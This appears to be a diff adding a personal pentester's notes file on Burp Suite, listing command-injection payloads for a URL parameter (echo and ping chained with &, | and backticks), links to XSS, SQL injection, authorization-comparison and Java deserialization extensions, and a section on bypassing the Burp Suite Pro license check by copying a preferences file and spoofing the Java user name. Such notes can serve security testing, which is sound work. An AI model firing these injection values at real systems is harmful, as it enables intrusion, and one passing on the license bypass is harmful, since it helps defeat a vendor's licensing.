@@ -1,0 +1,38 @@
+# burp
+
+http://skora.net/news/24-itsec-projects/26-the-burp-sessionauth-extension
+
+* command injection
+?p=c9a93d87355f61b30f84e390
+?p=adsfc9a93d873df55e41acdf9672
+?p=adsf%26echo%20kikoo%20lolol%26
+?p=adsf|echo%20kikoo%20lolol||a
+?p=adsf&ping%20-n%2020%20127.0.0.1&
+?p=adsf|ping%20-n%2020%20127.0.0.1||x
+?p=adsf`ping%20-c%2020%20127.0.0.1`
+?p=adsf|ping%20-c%2020%20127.0.0.1||x
+
+
+# plugins
+* xss
+https://github.com/nVisium/xssValidator
+
+* sqlmap plugin and others
+http://code.google.com/p/gason/
+
+# compare
+http://blog.secureideas.com/2013/08/comparing-authorization-levels-with.html
+
+# java serialisation
+Attacking java serialisation (java thick clients / applets -> java web service): DSer / BurpDSer plugin for burp
+
+# extensions
+www.burpextensions.com
+https://pro.portswigger.net/bappstore/
+https://github.com/nccgroup/ has a lot of burp extensions
+
+# license check bypass
+copy ~/.java/.userPrefs/prefs.xml and provide same account username
+with: java -Duser.name=john -jar burpsuite_pro_v1.5.x.jar (worked with 1.5.17)
+
+
